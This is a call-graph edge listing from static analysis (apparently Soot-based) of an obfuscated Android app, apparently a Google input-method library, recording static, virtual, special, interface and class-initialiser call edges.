CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>(-1640531527) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicInteger: int addAndGet(int)>
VIRTUAL edge: $c6 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i5) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>("INSTANCE", 0) in <ldr: void <init>()> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>(r0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqn: lsa l()> ==> <lkq: lsb B()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hnq: void <init>()> ==> <iec: void <init>()>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int c()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: int hashCode()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r5) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
VIRTUAL edge: virtualinvoke $r0.<androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>
STATIC edge: $r1 = staticinvoke <lri: java.lang.Object[] o(java.lang.Object[],int)>($r1, $i0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lri: java.lang.Object[] o(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, $r5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, 0, $r8, 0, $i3) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.String: void <init>(char[],int,int)>($r4, $i1, $i0) in <nzh: boolean f(ivv)> ==> <java.lang.String: void <init>(char[],int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean containsAll(java.util.Collection)>($r4) in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljd: java.util.Map m()> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<lts: java.lang.Object e(int)>($i1) in <lsn: boolean ac()> ==> <lsm: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.util.List asList(java.lang.Object[])>($r1) in <ose: void <clinit>()> ==> <java.util.Arrays: java.util.List asList(java.lang.Object[])>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Invalid private use tag, other subtag is not empty") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r9) in <lqs: boolean containsAll(java.util.Collection)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: int[] w()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r27 = staticinvoke <java.lang.Float: java.lang.Float valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Float: java.lang.Float valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbv: void <init>(java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsc: boolean g(java.util.logging.Level)>($r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsc: boolean g(java.util.logging.Level)>
SPECIAL edge: specialinvoke $r27.<java.lang.AssertionError: void <init>(java.lang.Object)>("Overflow of RecursionDepth (possible error in core library)") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(4) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfb: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object h(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
STATIC edge: $i3 = staticinvoke <ql: int a(int[],int,int)>($r2, $i2, $i0) in <qj: int i(java.lang.Object,int)> ==> <ql: int a(int[],int,int)>
SPECIAL edge: specialinvoke $r1.<bek: void <init>(java.nio.ByteBuffer)>($r0) in <bel: java.io.InputStream a(java.nio.ByteBuffer)> ==> <bek: void <init>(java.nio.ByteBuffer)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void t(int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r14.<lkt: void <init>(int)>($i0) in <lmb: lme f()> ==> <lkt: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<lin: void <init>(ldp,lqd)>($r1, r0) in <lqd: lqd d(ldp)> ==> <lin: void <init>(ldp,lqd)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i2) in <lma: int e(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 65, 90, 32) in <iwt: void f(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <liy: int size()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(0) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: lsb B()>() in <lqr: lsa l()> ==> <lkq: lsb B()>
INTERFACE edge: $z1 = interfaceinvoke $r0.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkx: void <init>()>() in <lqq: void <init>(java.lang.Object,java.lang.Object[],int)> ==> <lkx: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>($r7, $r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: int d(java.lang.Class,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lsj: void <init>(java.lang.Class)>(class "Ljava/lang/Object;") in <lsl: void <clinit>()> ==> <lsj: void <init>(java.lang.Class)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r9 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>($r1) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Class c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>(0, 0) in <lnd: void <init>(java.lang.Object[])> ==> <lsb: void <init>(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r1) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r0.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<lsz: boolean equals(java.lang.Object)>($r6) in <lsn: boolean ac()> ==> <java.lang.Object: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i1, $i0) in <lsb: void <init>(int,int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lqr: int hashCode()>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r2, $r3) in <ljb: void a()> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <lje: void a()> ==> <java.util.ConcurrentModificationException: void <init>()>
CLINIT edge: staticinvoke <lsh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsh: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
